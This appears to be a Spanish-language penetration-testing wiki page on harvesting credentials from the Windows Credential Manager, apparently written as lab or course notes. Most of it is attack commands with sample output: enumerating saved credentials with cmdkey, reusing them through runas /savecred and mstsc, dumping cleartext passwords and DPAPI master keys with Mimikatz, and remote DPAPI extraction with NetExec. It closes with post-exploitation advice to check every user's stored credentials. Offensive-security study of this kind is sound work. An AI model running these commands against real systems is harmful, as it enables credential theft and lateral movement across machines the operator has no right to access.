# Credential Manager de Windows

El Credential Manager es una funcionalidad integrada en Windows desde Server 2008 R2 y Windows 7 que permite a usuarios y aplicaciones almacenar credenciales de forma segura para sistemas externos, recursos de red y sitios web. Para un atacante con sesión activa en el sistema, es una fuente directa de credenciales ya descifradas o reutilizables sin necesidad de conocer la contraseña.

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

### Almacenamiento físico

Las credenciales se guardan cifradas en carpetas específicas del sistema, protegidas con DPAPI:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Cada carpeta vault contiene un archivo `Policy.vpol` con las claves AES (128 o 256 bits) protegidas por DPAPI, que son las que cifran las credenciales almacenadas. En versiones modernas de Windows con Credential Guard activo, las masterkeys DPAPI se almacenan en enclaves de memoria seguros (VBS).

### Tipos de credenciales

| Tipo                    | Descripción                                                                           |
| ----------------------- | ------------------------------------------------------------------------------------- |
| **Web Credentials**     | Credenciales de sitios web — usadas por Internet Explorer y Edge Legacy               |
| **Windows Credentials** | Tokens de login para servicios como OneDrive, shares de red, dominios, RDP            |
| **Generic Credentials** | Aplicaciones de terceros: Office 365, Teams, clientes VPN, herramientas de desarrollo |
| **Certificate-Based**   | Certificados de autenticación                                                         |

Microsoft denomina los almacenes físicos **Credential Lockers** (antes Windows Vaults). Credential Manager es la API/interfaz de usuario; los vaults son el almacenamiento real.

### Enumeración — cmdkey

`cmdkey` lista todas las credenciales almacenadas en el perfil del usuario actual:

```cmd
cmdkey /list
```

Salida típica:

```
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

| Campo                         | Descripción                                                                     |
| ----------------------------- | ------------------------------------------------------------------------------- |
| **Target**                    | Recurso al que aplica la credencial (equipo, dominio, identificador especial)   |
| **Type**                      | `Generic` para credenciales generales, `Domain Password` para logins de dominio |
| **User**                      | Cuenta asociada                                                                 |
| **Local machine persistence** | La credencial sobrevive reinicios                                               |

La entrada `virtualapp/didlogical` es interna de servicios Microsoft Live — se puede ignorar. La entrada `Domain:interactive=SRV01\mcharles` es una credencial de dominio para login interactivo: objetivo directo.

### Uso directo con runas /savecred

Si existe una credencial de dominio almacenada, se puede ejecutar comandos como ese usuario sin conocer su contraseña:

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

```cmd
# Verificar el contexto de la nueva shell
whoami
# srv01\mcharles
```

> &#x20;`runas /savecred` es una técnica de elevación lateral que se pasa por alto con frecuencia. Si un administrador usó `/savecred` alguna vez, sus credenciales quedan almacenadas y cualquier usuario del sistema puede reutilizarlas sin conocer la contraseña.

### Credenciales RDP almacenadas

```cmd
# Listar credenciales RDP guardadas
cmdkey /list | findstr "TERMSRV"

# Conectar usando la credencial almacenada sin especificar contraseña
mstsc /v:192.168.1.20
```

### Extracción con Mimikatz

#### sekurlsa::credman — desde LSASS

Si el usuario objetivo tiene una sesión activa, sus credenciales del Credential Manager están en LSASS y `sekurlsa::credman` las extrae directamente:

```
privilege::debug
sekurlsa::credman
```

Salida:

```
Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : <contraseña en claro>
```

#### dpapi — descifrado manual de archivos vault

Si no hay sesión activa del usuario pero se tienen sus archivos de credenciales:

```
# Extraer masterkeys de LSASS
sekurlsa::dpapi

# Descifrar credenciales manualmente
dpapi::cred /in:C:\Users\jsmith\AppData\Local\Microsoft\Credentials\*
dpapi::masterkey /in:C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-*\* /rpc

# Listar y volcar vault
vault::list
vault::cred
```

### Extracción remota con NetExec

```bash
netexec smb 192.168.1.10 -u admin -p Pass123 --dpapi
```

### Exportar el vault (técnica de backup)

Windows permite exportar el vault a un archivo `.crd` cifrado con contraseña:

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

Abre la interfaz gráfica de gestión de credenciales. Los backups `.crd` pueden importarse en otros sistemas Windows — si se obtiene uno y se conoce la contraseña de exportación, se recuperan todas las credenciales.

### Herramientas alternativas

| Herramienta                      | Método                                                     |
| -------------------------------- | ---------------------------------------------------------- |
| **Mimikatz** `sekurlsa::credman` | Extracción desde LSASS (sesión activa)                     |
| **Mimikatz** `dpapi::cred`       | Descifrado manual de archivos vault                        |
| **SharpDPAPI**                   | Extracción y descifrado DPAPI desde .NET                   |
| **LaZagne**                      | Búsqueda automatizada de credenciales en múltiples fuentes |
| **DonPAPI**                      | Extracción remota de secretos DPAPI                        |
| **NetExec** `--dpapi`            | Extracción remota con credenciales de admin                |

> Durante post-exploitation, revisar siempre el Credential Manager de todos los usuarios que han iniciado sesión en el sistema. Las cuentas de administradores y técnicos de IT suelen acumular credenciales de múltiples sistemas críticos — un solo `cmdkey /list` puede revelar acceso directo a servidores, shares o entornos cloud.
